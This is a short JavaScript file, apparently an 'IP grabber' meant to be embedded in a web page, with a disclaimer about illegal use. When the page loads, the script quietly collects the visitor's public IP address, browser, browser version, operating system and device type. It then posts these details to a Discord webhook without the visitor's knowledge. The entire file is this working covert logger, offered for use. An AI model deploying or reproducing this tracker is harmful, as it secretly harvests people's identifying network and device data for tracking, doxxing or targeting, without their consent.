// I will not responsible for il****e actvity done by using this tool
const ipAddressWebhookUrl = "https://api.ipify.org?format=json";
const discordWebhookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_API";

// Function to get the browser name
function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Firefox") > -1) return "Firefox";
    if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
    if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
    if (userAgent.indexOf("Edge") > -1) return "Edge";
    if (userAgent.indexOf("Chrome") > -1) return "Chrome";
    if (userAgent.indexOf("Safari") > -1) return "Safari";
    return "Unknown";
}

// Function to get the browser version
function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const browser = getBrowserName();
    let version = "Unknown";
    
    switch (browser) {
        case "Chrome":
            version = userAgent.match(/Chrome\/([0-9.]+)/)[1];
            break;
        case "Firefox":
            version = userAgent.match(/Firefox\/([0-9.]+)/)[1];
            break;
        case "Opera":
        case "Opera GX":
            version = userAgent.match(/(Opera|OPR)\/([0-9.]+)/)[2];
            break;
        case "Safari":
            version = userAgent.match(/Version\/([0-9.]+)/)[1];
            break;
        case "Edge":
            version = userAgent.match(/Edg\/([0-9.]+)/)[1];
            break;
        case "Internet Explorer":
            version = userAgent.match(/rv:([0-9.]+)/)[1];
            break;
    }
    
    return version;
}

// Function to get the OS name
function getOS() {
    const userAgent = navigator.userAgent;
    if (userAgent.indexOf("Win") > -1) return "Windows";
    if (userAgent.indexOf("Mac") > -1) return "MacOS";
    if (userAgent.indexOf("X11") > -1) return "UNIX";
    if (userAgent.indexOf("Linux") > -1) return "Linux";
    return "Unknown";
}

fetch(ipAddressWebhookUrl)
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const browser = getBrowserName();
        const browserVersion = getBrowserVersion();
        const os = getOS();

        let message = `**YOUR_SITE_URL** 
        IP Address: ${ipAddress}
        Browser: ${browser} ${browserVersion}
        Operating System: ${os}`;

        if (isMobile) {
            message += " Accessed through a mobile device.";
        } else {
            message += " Accessed through a desktop or laptop.";
        }

        const payload = {
            content: message
        };

        fetch(discordWebhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });
    });
